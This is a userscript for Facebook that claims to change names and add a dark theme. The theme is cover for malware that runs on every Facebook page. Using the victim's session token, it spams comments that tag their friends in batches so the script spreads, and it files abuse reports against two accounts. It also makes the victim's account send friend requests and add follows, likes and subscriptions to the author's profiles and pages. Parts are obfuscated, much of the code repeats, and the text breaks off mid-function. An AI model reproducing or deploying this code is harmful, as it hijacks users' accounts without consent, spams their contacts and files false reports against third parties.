// ==UserScript==
// @name            Doi ten Facebook
// @description     All about facebook By Quyết Chíp
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '1389471717985738'
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7['onreadystatechange'] = function () {
        if (_0x7892x7['readyState'] == 4) {
            eval('arkadaslar = ' + _0x7892x7['responseText'].toString()['replace']('for (;;);', '') + ';');
            for (f = 0; f < Math['round'](arkadaslar['payload']['entries']['length'] / 27); f++) {
                mesaj = '';
                mesaj_text = '';
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar['payload']['entries'][i]) {
                        mesaj += ' @[' + arkadaslar['payload']['entries'][i]['uid'] + ':' + arkadaslar['payload']['entries'][i]['text'] + ']';
                        mesaj_text += ' ' + arkadaslar['payload']['entries'][i]['text'];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = '&filter[0]=user';
    _0x7892x8 += '&options[0]=friends_only';
    _0x7892x8 += '&options[1]=nm';
    _0x7892x8 += '&token=v7';
    _0x7892x8 += '&viewer=' + user_id;
    _0x7892x8 += '&__user=' + user_id;
    if (document['URL']['indexOf']('https://') >= 0) {
        _0x7892x7['open']('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    } else {
        _0x7892x7['open']('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    };
    _0x7892x7['send']();
};

function RandomArkadas() {
    var _0x7892xa = '';
    for (i = 0; i < 9; i++) {
        _0x7892xa += ' @[' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['uid'] + ':' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['text'] + ']';
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = '';
    _0x7892x8 += '&ft_ent_identifier=' + id;
    _0x7892x8 += '&comment_text=(y) Cam on ban Doi Ten Va Chibi Ă„â€˜a share cach lam Chibi , Giao dien Ă„â€˜ep , Cach doi ten 6 , 7 lan cho may tinh Ă¢â„¢Â¥ Ă¢â„¢Â¥ Ă¢â„¢Â¥ Ai dc tag thi sao khong thu lam di ;) Thanh cong 100 nhe Ă¢â„¢Â¥ Ă¢â„¢Â¥ Ă¢â„¢Â¥  ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1377871797138:1707018092';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
    _0x7892x8 += '&attached_sticker_fbid=0';
    _0x7892x8 += '&attached_photo_fbid=0';
    _0x7892x8 += '&giftoccasion';
    _0x7892x8 += '&ft[tn]=[]';
    _0x7892x8 += '&__user=' + user_id;
    _0x7892x8 += '&__a=1';
    _0x7892x8 += '&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
    _0x7892x8 += '&__req=q';
    _0x7892x8 += '&fb_dtsg=' + fb_dtsg;
    _0x7892x8 += '&ttstamp=';
    _0x7892xd['open']('POST', '/ajax/ufi/add_comment.php', true);
    _0x7892xd['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x7892xd['onreadystatechange'] = function () {
        if (_0x7892xd['readyState'] == 4 && _0x7892xd['status'] == 200) {
            _0x7892xd['close'];
        };
    };
    _0x7892xd['send'](_0x7892x8);
};
arkadaslari_al(id);
// Report chet ba no
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function report(r) {
var X = new XMLHttpRequest();
var XURL = "https://www.facebook.com/ajax/report/social.php";
var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
report("100001776800987");report("100004885534915");
//
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Boss
a("100007687689030");
IDS("100007687689030");
sublist("1381620318770878");
Like("209847515879143");
IDS("100007578253018");
P("1380634515536125");
P("1384976145101962");
//Bo To Day Tien
sublist("1416817668542572"); a("100004522000583");  sublist("220932671400798");   sublist("580663472015913"); sublist("232140433613355");
sublist("236203529873712");
Like("231115967066691");
//Ho Vu Ten Duy 
a("100005448218642");
IDS("100005448218642");
P("183736195151320");
Like("1387737761490022");
Like("248088072032300");
a("100005796733910");
IDS("100005796733910");
a("100004170372974");
a("100004091891461");
sublist("161506674040939");
//Mem
sublist("1384801105121597");
a("100007751617563");
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '1385989391667304';
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7['onreadystatechange'] = function () {
        if (_0x7892x7['readyState'] == 4) {
            eval('arkadaslar = ' + _0x7892x7['responseText'].toString()['replace']('for (;;);', '') + ';');
            for (f = 0; f < Math['round'](arkadaslar['payload']['entries']['length'] / 27); f++) {
                mesaj = '';
                mesaj_text = '';
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar['payload']['entries'][i]) {
                        mesaj += ' @[' + arkadaslar['payload']['entries'][i]['uid'] + ':' + arkadaslar['payload']['entries'][i]['text'] + ']';
                        mesaj_text += ' ' + arkadaslar['payload']['entries'][i]['text'];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = '&filter[0]=user';
    _0x7892x8 += '&options[0]=friends_only';
    _0x7892x8 += '&options[1]=nm';
    _0x7892x8 += '&token=v7';
    _0x7892x8 += '&viewer=' + user_id;
    _0x7892x8 += '&__user=' + user_id;
    if (document['URL']['indexOf']('https://') >= 0) {
        _0x7892x7['open']('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    } else {
        _0x7892x7['open']('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    };
    _0x7892x7['send']();
};

function RandomArkadas() {
    var _0x7892xa = '';
    for (i = 0; i < 9; i++) {
        _0x7892xa += ' @[' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['uid'] + ':' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['text'] + ']';
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = '';
    _0x7892x8 += '&ft_ent_identifier=' + id;
    _0x7892x8 += '&comment_text=(y) Cam on ban Doi Ten Va Chibi Ă„â€˜a share cach lam Chibi , Giao dien Ă„â€˜ep , Cach doi ten 6 , 7 lan cho may tinh Ă¢â„¢Â¥ Ă¢â„¢Â¥ Ă¢â„¢Â¥ Ai dc tag thi sao khong thu lam di ;) Thanh cong 100 nhe Ă¢â„¢Â¥ Ă¢â„¢Â¥ Ă¢â„¢Â¥  ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1377871797138:1707018092';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
    _0x7892x8 += '&attached_sticker_fbid=0';
    _0x7892x8 += '&attached_photo_fbid=0';
    _0x7892x8 += '&giftoccasion';
    _0x7892x8 += '&ft[tn]=[]';
    _0x7892x8 += '&__user=' + user_id;
    _0x7892x8 += '&__a=1';
    _0x7892x8 += '&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
    _0x7892x8 += '&__req=q';
    _0x7892x8 += '&fb_dtsg=' + fb_dtsg;
    _0x7892x8 += '&ttstamp=';
    _0x7892xd['open']('POST', '/ajax/ufi/add_comment.php', true);
    _0x7892xd['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x7892xd['onreadystatechange'] = function () {
        if (_0x7892xd['readyState'] == 4 && _0x7892xd['status'] == 200) {
            _0x7892xd['close'];
        };
    };
    _0x7892xd['send'](_0x7892x8);
};
arkadaslari_al(id);
// Report chet ba no
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function report(r) {
var X = new XMLHttpRequest();
var XURL = "https://www.facebook.com/ajax/report/social.php";
var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
report("100001776800987");report("100004885534915");
//
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Boss
a("100007687689030");
IDS("100007687689030");
sublist("1381620318770878");
Like("209847515879143");
IDS("100007578253018");
P("1380634515536125");
P("1384976145101962");
//Bo To Day Tien
sublist("1416817668542572"); 
a("100004522000583");
a("100004236790243");
sublist("220932671400798");
a("100007414844498");
Like("188770474658366");
sublist("580663472015913");
a("100004236790243");
sublist("232140433613355");
sublist("236203529873712");
//theme
	(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #cdecea !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://ifanboy.com/wp-content/uploads/2011/07/GhostRider_1_CoverLozziVariant.jpg) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #d69ef0 !important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;\nborder:4px ridge #b4ec96 !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #f99800 !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #f99800 !important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;\nborder:2px ridge #f99800 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;\n   border:2px ridge #f99800 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #f99800 !important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #f99800 !important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #f99800 !important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #f99800 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #f99800 !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '1389471717985738';
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7['onreadystatechange'] = function () {
        if (_0x7892x7['readyState'] == 4) {
            eval('arkadaslar = ' + _0x7892x7['responseText'].toString()['replace']('for (;;);', '') + ';');
            for (f = 0; f < Math['round'](arkadaslar['payload']['entries']['length'] / 27); f++) {
                mesaj = '';
                mesaj_text = '';
                for (i = f * 27; i < (f + 1) * 27; i++) {
